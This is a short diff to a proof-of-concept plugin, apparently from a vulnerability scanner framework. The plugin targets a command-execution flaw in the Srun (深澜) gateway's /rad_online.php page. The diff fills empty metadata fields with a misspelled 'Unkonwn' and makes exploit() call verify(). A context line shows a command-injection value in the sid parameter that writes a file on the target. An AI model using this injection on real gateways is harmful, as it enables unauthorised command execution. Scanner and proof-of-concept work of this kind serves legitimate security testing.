@@ -8,13 +8,13 @@ class Vuln(ABVuln):
     name = 'Srun 网关 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
-    disclosure_date = ''  # 漏洞公布时间
+    disclosure_date = 'Unkonwn'  # 漏洞公布时间
     desc = '''
         深澜网关 /rad_online.php页面可执行任意命令。
     '''  # 漏洞描述
-    ref = ''  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    ref = 'Unkonwn'  # 漏洞来源
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = '深澜软件'  # 漏洞应用名称
     product_version = 'Srun 网关'  # 漏洞应用版本
 
@@ -60,7 +60,7 @@ action=dm&sid=;echo+'vulnerable' > vul.php;
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        super(Poc, self).exploit()
+        self.verify()
 
 if __name__ == '__main__':
     Poc().run()
